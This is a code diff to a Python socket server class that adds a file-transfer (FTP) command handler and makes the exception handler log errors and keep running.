@@ -9,7 +9,7 @@ import queue
 from tools.packet_manager import p_manager
 import time
 from tools.dictionary import *
-from tools.utils import packet_send, packet_recv
+from tools.utils import packet_send, packet_recv, file_send
 
 class baseServer():
     def __init__(self, port, listen=1):
@@ -61,6 +61,7 @@ class baseServer():
             try:
                 if (not(self.send_list.empty())):
                     packet = self.send_list.get()
+
                     packet_send(command=packet[PK_COMMAND_FLAG],
                                 payload=packet[PK_PAYLOAD_FLAG],
                                 cipherClass=cipherClass,
@@ -111,6 +112,7 @@ class baseServer():
 
                 elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_SIGNOUT:
                     self.stop = True
+
                 elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_CHECK_CON:
                     #Checks active connection
 
@@ -120,6 +122,10 @@ class baseServer():
                         output = self.active_connection[1]
 
                     print("Current connection is : {}".format(output))
+
+                elif packet[PK_COMMAND_FLAG] == COMMAND_FTP:
+                    file_send(packet[PK_PAYLOAD_FLAG], self.send_list)
+
 
                 elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_HELP:
                     help_text = '''
@@ -141,7 +147,6 @@ class baseServer():
                         self.send_list.put(packet)
                 print("Done.")
             except Exception as e:
-                raise e
                 print(e)
                 continue
 
